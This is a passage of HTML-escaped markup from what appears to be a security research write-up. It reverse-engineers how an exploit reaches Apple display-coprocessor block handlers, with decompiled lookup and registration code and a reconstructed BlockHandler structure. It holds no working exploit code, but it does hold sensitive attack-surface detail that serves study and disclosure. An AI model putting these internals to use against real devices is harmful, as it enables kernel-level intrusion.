HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.b1eaf3e2e954d8f37bc987b98c30e92ce161e849\"&gt;&lt;/a&gt;&lt;a id=\"t.15\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; block_type_handler &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;lookup_a_handler_for_block_type_and_subtype&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;a1&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;first_scalar_input&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c30\"&gt;// block_type&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;a3&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c30\"&gt;// subtype&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The exploit calls this &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;set_block&lt;/span&gt;&lt;span&gt;&amp;nbsp;external method twice, passing two different values for &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;first_scalar_input&lt;/span&gt;&lt;span&gt;, &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;7&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;19&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;. Here we can see that those correspond to looking up two different block handler objects here.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The lookup function searches a linked list of block handler structures; the head of the list is stored at offset &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;0x1448&lt;/span&gt;&lt;span&gt;&amp;nbsp;in the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;UPPipeDCP_H13P&lt;/span&gt;&lt;span&gt;&amp;nbsp;object and registered dynamically by a method I've named &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;add_handler_for_block_type&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.0dbaa54d4462638b9beda378f3267a7a7c4ded25\"&gt;&lt;/a&gt;&lt;a id=\"t.16\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;add_handler_for_block_type&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;block_handler_holder &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;handler_list&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;BlockHandler&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;handler&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;)&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c6 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The logging code tells us that this is in a file called &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;IOMFBBlockManager.cpp&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;. IDA finds 44 cross-references to this method, indicating that there are probably that many different block handlers. The structure of each registered block handler is something like this:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.3c5d4c46eb785d82b4debfb43373bde140bc52fe\"&gt;&lt;/a&gt;&lt;a id=\"t.17\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;__cppobj &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;BlockHandler&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;:&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0 HovzfPYjjR-c2\"&gt;&amp;nbsp;RTKIT_RC_RTTI_BASE&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint64_t field_16&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;handler_inner_types_entry &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;inner_types_array&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint32_t n_inner_types_array_entries&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint32_t field_36&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint8_t can_run_without_commandgate&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint32_t block_type&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint64_t list_link&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint64_t list_other_link&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint32_t some_other_type_field&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint32_t some_other_type_field2&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint32_t expected_structure_io_size&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint32_t field_76&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint64_t getBlock_Impl&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint64_t setBlock_Impl&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint64_t field_96&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp; uint64_t back_ptr_to_UPPipeDCP_H13P&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;};&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;The RTTI type is &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;BLHA&lt;/span&gt;&lt;span&gt;&amp;nbsp;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;BL&lt;/span&gt;&lt;span&gt;ock &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;HA&lt;/span&gt;&lt;span&gt;ndler.)&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;For example, here's the codepath which builds and registers block handler type 24:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;&lt;a id=\"t.15a6e240c53ab46ec843eed2902a63a7ce3a078d\"&gt;&lt;/a&gt;&lt;a id=\"t.18\"&gt;&lt;/a&gt;&lt;table class=\"HovzfPYjjR-c20\"&gt;&lt;tr class=\"HovzfPYjjR-c18\"&gt;&lt;td class=\"HovzfPYjjR-c13\" colspan=\"1\" rowspan=\"1\"&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;struct&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;BlockHandler&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*)&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;CXXnew&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;112LL&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;__vftable &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c14\"&gt;BlockHandler_vtbl&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;*)&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_super_vtable&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;block_type &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;refcnt &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;1&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;can_run_without_commandgate &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;some_other_type_field &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0LL&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;expected_structure_io_size &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0xD20&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;typeid&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;typeid_BLHA&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;();&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;typeid&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;typeid&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;modify_typeid_ref&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c9\"&gt;typeid&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;1&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;__vftable &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;vtable_BLHA_subclass_type_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;inner_types_array &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0LL&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;n_inner_types_array_entries &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;getBlock_Impl &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;BLHA_24_getBlock_Impl&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;setBlock_Impl &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;BLHA_24_setBlock_Impl&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;field_96 &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c4\"&gt;0LL&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;back_ptr_to_UPPipeDCP_H13P &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;=&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;a1&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3\"&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;add_handler_for_block_type&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;(&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;list_holder&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;,&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c0\"&gt;&amp;nbsp;BLHA_24&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c1\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;Each block handler optionally has &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;getBlock_Impl&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;setBlock_Impl&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;function pointers which appear to implement the actual setting and getting operations.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;span&gt;We can go through all the callsites which add block handlers; tell IDA the type of the arguments and name all the &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;getBlock&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class=\"HovzfPYjjR-c7\"&gt;setBlock&lt;/span&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&amp;nbsp;implementations:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"c3 c8 c10\"&gt;&lt;span class=\"HovzfPYjjR-c5 HovzfPYjjR-c2\"&gt;&lt;/span&gt;&lt;/p&gt;&lt;br&gt;\n &lt;p class=\"HovzfPYjjR-c3 HovzfPYjjR-c8\"&gt;&lt;img /&gt;&lt;/p&gt;\n &lt;p class=\"HovzfPYjjR-c3 